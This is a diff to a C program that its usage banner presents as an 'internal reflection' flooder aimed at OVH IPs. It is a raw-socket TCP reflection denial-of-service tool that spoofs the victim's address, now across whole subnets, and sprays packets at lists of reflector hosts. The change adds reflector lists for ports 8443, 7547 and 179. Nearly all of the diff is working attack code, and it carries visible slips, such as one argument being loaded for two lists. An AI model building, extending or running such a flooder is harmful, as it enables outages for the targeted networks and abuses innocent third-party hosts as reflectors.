@@ -72,6 +72,9 @@ struct thread_data
 	struct list *list_993;
 	struct list *list_465;
 	struct list *list_587;
+	struct list *list_8443;
+	struct list *list_179;
+	struct list *list_7547;
 };
 
 void init_rand(unsigned long int x)
@@ -182,7 +185,7 @@ void setup_ip_header(struct iphdr *iph)
 	iph->saddr = inet_addr("0.0.0.0");
 }
 
-int ports[15] = {0, 22, 80, 443, 53, 8080, 3306, 21, 25, 110, 143, 995, 993, 465, 587};
+int ports[18] = {0, 22, 80, 443, 53, 8080, 3306, 21, 25, 110, 143, 995, 993, 465, 587, 8443, 7547, 179};
 int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -256,6 +259,9 @@ void *flood(void *par1)
 	struct list *list_993 = td->list_993;
 	struct list *list_465 = td->list_465;
 	struct list *list_587 = td->list_587;
+	struct list *list_8443 = td->list_8443;
+	struct list *list_179 = td->list_179;
+	struct list *list_7547 = td->list_7547;
 
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
@@ -290,6 +296,8 @@ void *flood(void *par1)
 	int sizeof_ports = sizeof(ports) / sizeof(ports[0]) - 1;
 	while (1)
 	{
+		/** Allow subnet attacks */
+		iph->saddr = sins[sn_i].sin_addr.s_addr;
 		ports[0] = randnum(1, 1024);
 		tcph->check = 0;
 		opts->mssvalue = htons(1360 + (rand_cmwc() % 100));
@@ -421,6 +429,30 @@ void *flood(void *par1)
 			iph->check = csum((unsigned short *)datagram, iph->tot_len);
 			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
 			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_993->data, sizeof(list_993->data));
+		}
+		else if (reflectionType == 7547)
+		{
+			list_7547 = list_7547->next;
+			iph->daddr = list_7547->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_7547->data, sizeof(list_7547->data));
+		}
+		else if (reflectionType == 179)
+		{
+			list_179 = list_179->next;
+			iph->daddr = list_179->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_179->data, sizeof(list_179->data));
+		}
+		else if (reflectionType == 8443)
+		{
+			list_8443 = list_8443->next;
+			iph->daddr = list_8443->data.sin_addr.s_addr;
+			iph->check = csum((unsigned short *)datagram, iph->tot_len);
+			tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+			sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8443->data, sizeof(list_8443->data));
 		}
 
 		pps++;
@@ -583,7 +615,7 @@ int main(int argc, char *argv[])
 	if (argc < 19)
 	{
 		fprintf(stdout, "Internal Reflection via Source route OVH IPs by @cxmmand - netty\n");
-		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 53] [List Port 22] [List Port 3306] [List Port 21] [List Port 25] [List port 110] [List Port 143] [List Port 995] [List Port 995] \n", argv[0]);
+		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 53] [List Port 22] [List Port 3306] [List Port 21] [List Port 25] [List port 110] [List Port 143] [List Port 995] [List Port 995] [List Port 8443] [List Port 7547] [List Port 179] \n", argv[0]);
 		exit(-1);
 	}
 	srand(time(NULL));
@@ -616,9 +648,12 @@ int main(int argc, char *argv[])
 	list_t *list_993 = loadList(argv[17], max_len, &count);
 	list_t *list_465 = loadList(argv[18], max_len, &count);
 	list_t *list_587 = loadList(argv[19], max_len, &count);
+	list_t *list_8443 = loadList(argv[20], max_len, &count);
+	list_t *list_7547 = loadList(argv[21], max_len, &count);
+	list_t *list_179 = loadList(argv[21], max_len, &count);
 
 	// Check if lists loaded successfully
-	if (!list_80 || !list_443 || !list_8080 || !list_53 || !list_22 || !list_3306 || !list_21 || !list_25 || !list_110 || !list_143 || !list_995 || !list_993 || !list_465 || !list_587)
+	if (!list_80 || !list_443 || !list_8080 || !list_53 || !list_22 || !list_3306 || !list_21 || !list_25 || !list_110 || !list_143 || !list_995 || !list_993 || !list_465 || !list_587 || !list_179 || !list_8443 || !list_7547)
 	{
 		fprintf(stderr, "Failed to load one IP list\n");
 		exit(-1);
@@ -699,6 +734,9 @@ int main(int argc, char *argv[])
 		td[i].list_993 = list_993;
 		td[i].list_465 = list_465;
 		td[i].list_587 = list_587;
+		td[i].list_8443 = list_8443;
+		td[i].list_7547 = list_7547;
+		td[i].list_179 = list_179;
 
 		if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0)
 		{
